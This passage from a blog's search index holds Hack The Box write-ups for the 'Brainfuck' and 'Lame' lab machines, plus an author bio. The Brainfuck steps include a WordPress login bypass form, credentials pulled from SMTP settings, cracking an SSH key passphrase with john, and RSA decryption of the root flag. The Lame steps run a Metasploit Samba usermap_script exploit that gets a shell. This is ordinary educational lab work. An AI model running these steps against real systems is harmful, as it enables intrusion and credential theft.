value=\u0026#34;loginGuestFacebook\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; ----------------------------------------------------------------    After creating the payload we can host the form using python  python -m SimpleHTTPServer # within the file that contains the html form\rgo to -\u0026gt; localhost.com:8000 and click login\rgo back to the website -\u0026gt; https://brainfuck.htb/ # We are logged-in ##SMTP\n Going to Dashboard → Appearance → Editor The files are not writable to get a shell Going to Settings → Easy WP SMTP  Found:  SMTP username: orestis SMTP Password: kHGuERB29DNiNE # Inspect element on the password field to get the password      1  sudo apt-get install evolution # Download evolution mail client    Open the evolution program → next → next  Full Name: Orestis\nEmail Address: orestis@brainfuck.htb\n Server: brainfuck.htb Username: orestis Port: 143 No encryption Skip Options   Server: brainfuck.htb Port: 25 Encryption method: No encryption  Enter the password in the mail application: kHGuERB29DNiNE\n1 2 3 4 5 6  Hi there, your credentials for our \u0026#34;secret\u0026#34; forum are below :) username: \u0026lt;mark\u0026gt;\u0026lt;span style=\u0026#34;color:red\u0026#34;\u0026gt;**admin**\u0026lt;/span\u0026gt;\u0026lt;/mark\u0026gt; and \u0026lt;mark\u0026gt;\u0026lt;span style=\u0026#34;color:red\u0026#34;\u0026gt;**orestis**\u0026lt;/span\u0026gt;\u0026lt;/mark\u0026gt; password: \u0026lt;mark\u0026gt;\u0026lt;span style=\u0026#34;color:red\u0026#34;\u0026gt;**admin**\u0026lt;/span\u0026gt;\u0026lt;/mark\u0026gt; and \u0026lt;mark\u0026gt;\u0026lt;span style=\u0026#34;color:red\u0026#34;\u0026gt;**kIEnnfEKJ#9UmdO**\u0026lt;/span\u0026gt;\u0026lt;/mark\u0026gt; Regards    Creds -\u0026gt; username: orestis | password: kIEnnfEKJ#9UmdO  1 2 3 4 5 6 7 8 9 10 11  Your new WordPress site has been successfully set up at: https://brainfuck.htb You can log in to the administrator account with the following information: Username: admin Password: The password you chose during the install. Log in here: https://brainfuck.htb/wp-login.php We hope you enjoy your new site. Thanks!    Login with the creds found in the Super Secret Forum orestis | kIEnnfEKJ#9UmdO Identified that is Vigenere cipher  https://www.dcode.fr/vigenere-cipher  Vigenere Ciphertext → Pieagnm - Jkoijeg nbw zwx mle grwsnn Keypassword → Orestis - Hacking for fun and profit → Brainfu - Ckmybra inf uck myb rainfu → brainfuck     Decipher the rest of the message  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  Cipher: Vigenere | key: fuckmybrain ---------------------------------------- orestis Mya qutf de buj otv rms dy srd vkdof Pieagnm - Jkoijeg nbw zwx mle grwsnn admin Xua zxcbje iai c leer nzgpg ii uy... orestis Ufgoqcbje.... Wejmvse - Fbtkqal zqb rso rnl cwihsf admin Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr orestis Si rbazmvm, Q\u0026#39;yq vtefc gfrkr nn Qbqquzs - Pnhekxs dpi fca fhf zdmgzt ---------------------------------------- orestis Hey give me the url for my key bitch Orestis - Hacking for fun and profit admin Say please and i just might do so... orestis Pleeeease.... Orestis - Hacking for fun and profit admin There you go you stupid fuck, I hope you remember your key password because I dont https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa No problem, I\u0026#39;ll brute force it Orestis - Hacking for fun and profit   Interesting → There you go you stupid fuck, I hope you remember your key password because I dont https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa No problem, I\u0026rsquo;ll brute force it Orestis - Hacking for fun and profit\n We have encrypted id_rsa we need to use JohnTheRipper. We will be using ssh2john.py  1 2 3 4 5 6 7 8 9 10 11 12 13 14  locate ssh2john /usr/share/john/ssh2john.py id_rsa \u0026gt; forjohn.txt john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt -\u0026gt; Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 3poulakia! (id_rsa) 1g 0:00:00:06 DONE (2022-02-06 21:12) 0.1579g/s 1968Kp/s 1968Kc/s 1968KC/s 3poulakia! Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed.    Found ssh password 3poulakia!  1 2 3 4 5  ssh -i id_rsa orestis@10.10.10.17 -\u0026gt; password for id_rsa -\u0026gt; 3poulakia! cat user.txt -\u0026gt; ********************************   Privilege Escalation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  orestis@brainfuck:~$ ls -\u0026gt; debug.txt encrypt.sage mail output.txt user.txt orestis@brainfuck:~$ cat encrypt.sage nbits = 1024 password = open(\u0026#34;/root/root.txt\u0026#34;).read().strip() enc_pass = open(\u0026#34;output.txt\u0026#34;,\u0026#34;w\u0026#34;) debug = open(\u0026#34;debug.txt\u0026#34;,\u0026#34;w\u0026#34;) m = Integer(int(password.encode(\u0026#39;hex\u0026#39;),16)) p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False) q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False) n = p*q phi = (p-1)*(q-1) e = ZZ.random_element(phi) while gcd(e, phi) != 1: e = ZZ.random_element(phi) c = pow(m, e, n) enc_pass.write(\u0026#39;Encrypted Password: \u0026#39;+str(c)+\u0026#39;\\n\u0026#39;) debug.write(str(p)+\u0026#39;\\n\u0026#39;) debug.write(str(q)+\u0026#39;\\n\u0026#39;) debug.write(str(e)+\u0026#39;\\n\u0026#39;)    Google and paste p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False) →https://ctftime.org/writeup/6434. It is RSA Google how to decrypt RSA p q e  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  # Source: -\u0026gt; https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e nano decypher.txt --------------- def egcd(a, b): x,y, u,v = 0,1, 1,0 while a != 0: q, r = b//a, b%a m, n = x-u*q, y-v*q b,a, x,y, u,v = a,r, u,v, m,n gcd = b return gcd, x, y def main(): p = 1090660992520643446103273789680343 q = 1162435056374824133712043309728653 e = 65537 ct = 299604539773691895576847697095098784338054746292313044353582078965 # compute n n = p * q # Compute phi(n) phi = (p - 1) * (q - 1) # Compute modular inverse of e gcd, a, b = egcd(e, phi) d = a print( \u0026#34;n: \u0026#34; + str(d) ); # Decrypt ciphertext pt = pow(ct, d, n) print( \u0026#34;pt: \u0026#34; + str(pt) ) if __name__ == \u0026#34;__main__\u0026#34;: main()   1 2 3 4  restis@brainfuck:~$ cat debug.txt 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 # p value 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 # q value 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 # e value   1 2  orestis@brainfuck:~$ cat output.txt Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182 # replace this value in ct   1 2 3  python decrypt.py n: 8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977 pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750    Convert decimal to Hex →https://www.rapidtables.com/convert/number/decimal-to-hex.html Convert Hex to String →https://string-functions.com/hex-string.aspx  1 2 3 4 5 6  Decimal: 24604052029401386049980296953784287079059245867880966944246662849341507003750 to Hex: 3665666331613564626238393034373531636536353636613330356262386566 to string: 6efc1a5dbb8904751ce6566a305bb8ef root flag -\u0026gt; ********************************   Skills Learned  Enumerating SSL certificates Exploiting Wordpress Exploit modification Enumerating mail servers Decoding Vigenere ciphers SSH key brute forcing RSA decryption techniques  ","description":"Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.","id":22,"section":"posts","tags":["OSCP","rce","linux","wordpress","smtp","cryptography","ssl","cve"],"title":"Hackthebox - Brainfuck","uri":"https://hswootan.github.io/en/posts/brainfuck/"},{"content":"\r\rReconnaissance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  nmap -sC -sV -vv 10.10.10.3 -oN lame.nmap # Scan results # Nmap 7.92 scan initiated Sun Jan 30 12:20:52 2022 as: nmap -sC -sV -vv -oN lame.namp 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up, received echo-reply ttl 63 (0.019s latency). Scanned at 2022-01-30 12:20:52 EST for 56s Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.28 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg== | 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) |_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew== 139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 59488/tcp): CLEAN (Timeout) | Check 2 (port 42210/tcp): CLEAN (Timeout) | Check 3 (port 38811/udp): CLEAN (Timeout) | Check 4 (port 40169/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-security-mode: Couldn\u0026#39;t establish a SMBv2 connection. |_smb2-time: Protocol negotiation failed (SMB2) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2022-01-30T12:15:09-05:00 |_clock-skew: mean: 2h23m58s, deviation: 3h32m10s, median: -6m03s Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ # Nmap done at Sun Jan 30 12:21:48 2022 -- 1 IP address (1 host up) scanned in 56.47 seconds   Exploitation  https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  msfconsole use exploit/multi/samba/usermap_script show targets set target 0 show options set rhots 10.10.10.3 # Targeted machine set lhost 10.10.14.28 # Own machine set lport 8081 run or exploit   1 2 3 4 5 6 7 8 9  cd root cat root.txt Ans: ******************************* ---------------------------------------- cd home cd makis cat user.txt Ans: *******************************   Alternative 1 2 3  search samba 8 exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba \u0026#34;username map script\u0026#34; Command Execution   1 2 3 4 5 6 7 8  use exploit/multi/samba/usermap_script set rhosts 10.10.10.3 set lhost 10.10.14.28 set lport 8081 run   Skills Learned  Identifying vulnerable services Exploiting Samba  ","description":"Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.","id":23,"section":"posts","tags":["OSCP","linux","samba","rce","cve"],"title":"Hackthebox - Lame","uri":"https://hswootan.github.io/en/posts/lame/"},{"content":"Hello 👋 my name is Hong I am currently pursuing my degree in Cybersecurity. Interested in pen testing, cloud computing and web development. The purpose of this site is to keep track of my learning progress. I will be posting writeups on Hackthebox machines, Tryhackme, Vulnhub, CTF events, and more. Thanks for stopping by 😁.\n LinkedIn Tryhackme Hackthebox  ","description":"About me","id":24,"section":"","tags":null,"title":"About","uri":"https://hswootan.github.io/en/about/"}]